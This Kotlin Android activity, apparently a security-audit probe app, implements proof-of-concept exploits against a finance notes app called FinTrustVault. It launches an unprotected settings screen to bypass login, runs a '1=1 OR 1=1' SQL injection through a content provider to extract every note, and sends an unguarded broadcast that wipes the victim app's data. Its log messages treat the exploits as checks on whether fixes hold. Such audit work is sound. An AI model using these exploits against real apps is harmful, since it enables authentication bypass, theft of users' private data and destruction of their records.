package com.audit.probe

import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var journal: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val racine = LinearLayout(this)
        racine.orientation = LinearLayout.VERTICAL
        racine.setPadding(50, 120, 50, 40)

        val titre = TextView(this)
        titre.text = "AuditProbe — preuves de concept FinTrustVault"
        titre.textSize = 18f
        racine.addView(titre)

        val boutonV1 = Button(this)
        boutonV1.text = "Exploiter V1 (SettingsActivity)"
        boutonV1.setOnClickListener { executerV1() }
        racine.addView(boutonV1)

        val boutonV2 = Button(this)
        boutonV2.text = "Exploiter V2 (NotesProvider / injection)"
        boutonV2.setOnClickListener { executerV2() }
        racine.addView(boutonV2)

        val boutonV3 = Button(this)
        boutonV3.text = "Exploiter V3 (WipeReceiver)"
        boutonV3.setOnClickListener { executerV3() }
        racine.addView(boutonV3)

        val texteV4 = TextView(this)
        texteV4.text = "V4 : depuis FinTrustVault, appuyez sur \"Partager\" sur une note, puis choisissez AuditProbe dans la liste."
        texteV4.setPadding(0, 24, 0, 24)
        racine.addView(texteV4)

        val titreJournal = TextView(this)
        titreJournal.text = "Résultats :"
        titreJournal.setPadding(0, 24, 0, 8)
        racine.addView(titreJournal)

        journal = TextView(this)
        journal.text = ""
        racine.addView(journal)

        val defilement = ScrollView(this)
        defilement.addView(racine)
        setContentView(defilement)
    }

    private fun logger(message: String) {
        journal.append("$message\n\n")
    }

    // ---------- V1 : contourner l'écran de connexion ----------
    private fun executerV1() {
        try {
            val intent = Intent()
            intent.setClassName(
                "com.fintrust.vault",
                "com.fintrust.vault.SettingsActivity"
            )
            startActivity(intent)
            logger("V1 : RÉUSSI — SettingsActivity lancée sans authentification.")
        } catch (e: ActivityNotFoundException) {
            logger("V1 : ÉCHEC — activité introuvable ou non exportée (${e.message}).")
        } catch (e: SecurityException) {
            logger("V1 : ÉCHEC — accès refusé (${e.message}). Le correctif fonctionne.")
        }
    }

    // ---------- V2 : extraire toutes les notes par injection ----------
    private fun exploiterV2(context: Context): List<String> {
        val uri = Uri.parse("content://com.fintrust.vault.provider/notes")
        // La clause "1=1 OR 1=1" force la sélection de toutes les lignes,
        // quelle que soit une éventuelle condition prévue par le développeur
        val cursor = context.contentResolver.query(
            uri, null, "1=1 OR 1=1", null, null
        )
        val resultats = mutableListOf<String>()
        cursor?.use {
            val index = it.getColumnIndex("contenu")
            while (it.moveToNext()) {
                resultats.add(it.getString(index))
            }
        }
        return resultats
    }

    private fun executerV2() {
        try {
            val notes = exploiterV2(this)
            if (notes.isNotEmpty()) {
                logger("V2 : RÉUSSI — ${notes.size} note(s) extraite(s) :\n" + notes.joinToString("\n") { "• $it" })
            } else {
                logger("V2 : ÉCHEC — aucune donnée retournée (provider non accessible ou vide). Le correctif fonctionne probablement.")
            }
        } catch (e: SecurityException) {
            logger("V2 : ÉCHEC — accès refusé (${e.message}). Le correctif fonctionne.")
        } catch (e: Exception) {
            logger("V2 : ÉCHEC — exception : ${e.message}")
        }
    }

    // ---------- V3 : déclencher l'effacement à distance ----------
    private fun exploiterV3(context: Context) {
        val intent = Intent("com.fintrust.vault.ACTION_WIPE")
        intent.setPackage("com.fintrust.vault")
        context.sendBroadcast(intent)
    }

    private fun executerV3() {
        try {
            exploiterV3(this)
            logger("V3 : broadcast ACTION_WIPE envoyé. Rouvrez FinTrustVault pour vérifier que les notes ont disparu (réussi) ou sont toujours là (échec, correctif actif).")
        } catch (e: SecurityException) {
            logger("V3 : ÉCHEC — accès refusé (${e.message}). Le correctif fonctionne.")
        }
    }
}
